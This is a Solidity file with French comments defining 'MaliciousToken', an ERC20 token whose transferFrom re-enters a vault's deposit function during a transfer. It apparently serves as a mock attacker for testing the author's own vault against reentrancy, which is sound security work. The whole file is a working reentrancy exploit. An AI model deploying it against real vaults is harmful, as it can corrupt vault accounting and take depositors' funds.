// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Interface minimale pour interagir avec ton Vault
interface IVault {
    function deposit(uint256 assets, address receiver) external returns (uint256);
}

contract MaliciousToken is ERC20 {
    IVault public vault;
    bool private _isAttacking;

    constructor() ERC20("Malicious Token", "MAL") {
        // On donne des munitions à l'attaquant (celui qui déploie)
        _mint(msg.sender, 1000000 * 10**6);
    }

    function setVault(address _vault) external {
        vault = IVault(_vault);
    }

    // Surcharge la fonction transferFrom (utilisée par SafeERC20)
    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        // 1. Réalisation d'un transfert
        bool success = super.transferFrom(from, to, value);
        
        // 2. Rentrancy
        // Si le destinataire est le Vault, on redépose pendant le transfert
        if (address(vault) != address(0) && to == address(vault) && !_isAttacking) {
            _isAttacking = true;
            // Action de la réentrance
            vault.deposit(value, address(this)); 
            _isAttacking = false;
        }
        
        return success;
    }
}